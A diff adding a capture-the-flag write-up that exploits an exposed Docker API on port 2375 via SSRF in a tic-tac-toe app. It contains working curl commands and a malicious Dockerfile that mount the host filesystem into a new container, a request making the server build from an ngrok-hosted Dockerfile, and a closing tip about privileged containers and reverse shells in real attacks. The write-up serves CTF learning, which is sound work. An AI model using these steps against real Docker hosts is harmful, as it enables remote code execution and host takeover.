@@ -205,5 +205,74 @@ try:
 
 -------------------------
 
-- According to the docker file,
+- According to the docker file,Docker api is exposed on port `2375` which we can exploit to create containers,inject containers and carry out malicious.This will be the url to interact with to trigger an RCE. URL-: `localhost:2375`, the mount point in target will be `/flag` because the main goal is to read the flag.
+
+```Docker
+FROM python:3.9-alpine
+
+RUN apk add --no-cache docker-cli 
+
+WORKDIR /app
+
+COPY requirements.txt .
+
+RUN pip install -r requirements.txt
+
+COPY ./templates ./templates
+COPY app.py .
+COPY url.py .
+COPY flag.txt /flag/
+
+ENV DOCKER_HOST="tcp://localhost:2375"
+ENV GAME_API_DOMAIN="localhost"
+ENV GAME_API_PORT="8000"
+
+CMD ["gunicorn", "--bind", "0.0.0.0:80", "app:app", "--capture-output", "--log-level", "debug"]
+```
+
+-------------------
+
+### Exploitation-:
+
+------------------
+
+- I created a malicious dockerfile to create a container and set `/flag` in the main host to be mounted in our malicious container.
+
+```docker
+RUN apk add --no-cache curl jq
+
+RUN curl -X POST -H "Content-Type: application/json" -d '{"image": "alpine","Tty":true,"OpenStdin":true,"AutoRemove":true,"HostConfig":{"NetworkMode":"host","Binds":["/:/flag"]}}' http://localhost:2375/containers/create?name=shell
+RUN curl -X POST http://localhost:2375/containers/shell/start
+RUN exec_id=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":["mkdir", "/mnt/tmp/pwned"]}' http://localhost:2375/containers/shell/exec | jq -r .Id) && curl -X POST "http://localhost:2375/exec/$exec_id/start" -H "Content-Type: application/json" -d '{"Detach": false, "Tty": false}'
+```
+
+- Then, I made it accesible on the internet by tunnelling with ngrok.
+
+![image](https://github.com/user-attachments/assets/7d925138-8ee4-431d-8bd1-7829d118d7e1)
+
+- As explained in this [article](https://m0z.ie/research/2025-01-27-Developing-a-Docker-1-Click-RCE-chain-for-fun/) by M0z,an attacker can exploit dockerapi to build docker containers based  on dockerfiles hosted on the internet.It  might take time but it is building on the server.This can carried out with the `/build` endpoint.
+
+```bash
+❯ curl https://tic-tac-toe-8f5a953dc460f141.ctf.pearlctf.in/ -H "Content-Type: application/json" -d '{"api":{"http://localhost:8000/<game_action>":"http://localhost:2375/build?remote=http://4.tcp.eu.ngrok.io:12053/Dockerfile&networkmode=host"},"state":["X","X","X","X","X","X","X","X","X"],"action":"post"}'
+{"body":""}
+```
+
+![image](https://github.com/user-attachments/assets/9f3ef135-7e14-4ac7-8fe2-5e5a7500317f)
+
+- Them,we can execute commands on the container with `exec` endpoint.I grabbed the container's id from `/containers/json` endpoint which shows containers running on the server.
+
+![image](https://github.com/user-attachments/assets/1312d564-d464-4f6c-baa6-5851f5ea6a43)
+
+- I tried to read the flag at `/flag/flag/flag.txt`.To trigger a shell command on docker, an `exec` id has to be created which will be passed to the `/exec/[id]/start` endpoint to trigger the shell command.
+
+![image](https://github.com/user-attachments/assets/eaa5b7f4-f6ec-47ce-9f97-fd37179b2de0)
+
+- I read the output with the `/exec/[id]start` endpoint.
+
+![image](https://github.com/user-attachments/assets/6ac103b6-488d-4a29-b8b6-314567dfd220)
+
+- Flag-:```pearl{do_y0u_r34llY_kn0w_d0ck3r_w3ll?}```
+- In real life scenarios,you can mount a more critical directory e.g `/mnt/root`,try to create privileged container and spawn a reverse shell to gain access to the host files conveniently.I followed this approach to save time.
+
+
 
